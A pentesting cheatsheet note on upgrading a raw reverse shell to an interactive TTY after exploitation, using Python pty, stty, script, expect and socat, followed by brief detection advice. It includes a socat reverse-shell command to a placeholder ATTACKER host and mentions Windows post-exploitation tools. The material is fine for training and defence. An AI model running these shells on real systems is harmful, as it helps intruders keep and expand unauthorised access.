---
tags: [tools, shells, post-exploitation, pentesting, red-team]
difficulty: beginner
module: "46 - Operator Technique Cheatsheets"
topic: "46.02 Upgrading to a Full Interactive TTY"
---

# Upgrading to a Full Interactive TTY

## Introduction
A raw reverse/bind shell (see [[01 - Reverse and Bind Shell Cheatsheet]]) is a **"dumb" shell**: no job control, no tab completion, no arrow-key history, no `sudo`/`ssh`/`su` (they need a real terminal and die with *"must be run from a terminal"*), and Ctrl-C kills your whole session instead of the running command. **Upgrading to a full interactive TTY** (a pseudo-terminal, PTY) fixes all of this and is one of the first things to do after catching a shell. This note is the standard PTY-upgrade playbook.

## Why a Dumb Shell Hurts
```text
+---------------------------------------------------------------+
|  Dumb shell limitations         |  After PTY upgrade           |
+---------------------------------------------------------------+
|  Ctrl-C kills the session       |  Ctrl-C interrupts the cmd   |
|  no tab-complete / history      |  full readline               |
|  sudo/ssh/su -> "no tty" error  |  interactive auth works      |
|  no job control (bg/fg)         |  Ctrl-Z, jobs, fg            |
|  text editors (vi) misbehave    |  full-screen apps work       |
+---------------------------------------------------------------+
```

## The Standard Python PTY Upgrade (Linux)
The most common path, when Python exists on the target:
```bash
# 1. spawn a PTY on the target
python3 -c 'import pty;pty.spawn("/bin/bash")'
# (or python / python2; or: script -qc /bin/bash /dev/null)

# 2. background the shell:  Ctrl-Z

# 3. on YOUR machine, fix the local terminal + disable echo
stty raw -echo; fg
#    (type 'fg' even if you can't see it, then Enter)

# 4. back in the shell, set term + size
export TERM=xterm-256color
stty rows 50 columns 200        # match your real terminal (see `stty size` locally)
```
After this you have arrow keys, tab completion, Ctrl-C that interrupts the *foreground command*, and working `sudo`/`ssh`.

## Alternatives When Python Is Absent
```bash
# script(1) — almost always present
script -qc /bin/bash /dev/null
# expect
expect -c 'spawn /bin/bash; interact'
# perl
perl -e 'exec "/bin/bash";'                  # (still needs PTY tricks)
# socat — gives a FULL pty directly, no manual upgrade needed:
#   attacker:  socat file:`tty`,raw,echo=0 TCP-LISTEN:443
#   target:    socat TCP:ATTACKER:443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```
The **socat method** ([[53 - Socat Advanced Netcat Replacement]]) is the cleanest — it negotiates a real PTY on both ends, so no `stty` dance is required. Carry a static `socat` binary for targets that lack it.

## Windows Note
Windows `cmd`/PowerShell shells don't use PTYs the same way. For a fuller experience use **ConPTY-based** tooling (e.g. `ConPtyShell`) or, better, migrate to a proper C2 agent. `evil-winrm` and RDP give native interactivity when creds are available.

## Operational Tips
- Always run `stty raw -echo; fg` from **your** terminal, not the target.
- Set `TERM` and the correct rows/columns or `vi`/`less`/`clear` will render garbled.
- If the shell dies, you didn't background/foreground correctly — re-catch and retry.
- Once upgraded, you can safely run `su`, `sudo -l`, `ssh`, and full-screen tools needed for enumeration and privilege escalation.

## Why It Matters
Half of post-exploitation friction is a broken terminal. A proper PTY is the prerequisite for `sudo`-based privilege escalation, interactive password entry, and using editors/pagers — and it stops the classic "I pressed Ctrl-C and lost my shell" disaster.

## Defensive Notes
- Monitor for `pty.spawn`, `script -qc`, and `socat ... pty` invocations following a network shell — strong post-exploitation indicators.
- EDR/terminal telemetry: a service account suddenly allocating a PTY and running `sudo`/`ssh` is anomalous.

## Related Notes
- [[01 - Reverse and Bind Shell Cheatsheet]]
- [[53 - Socat Advanced Netcat Replacement]]
- [[03 - Tunneling and Port Forwarding]]
- [[02 - Enumeration Tools]]
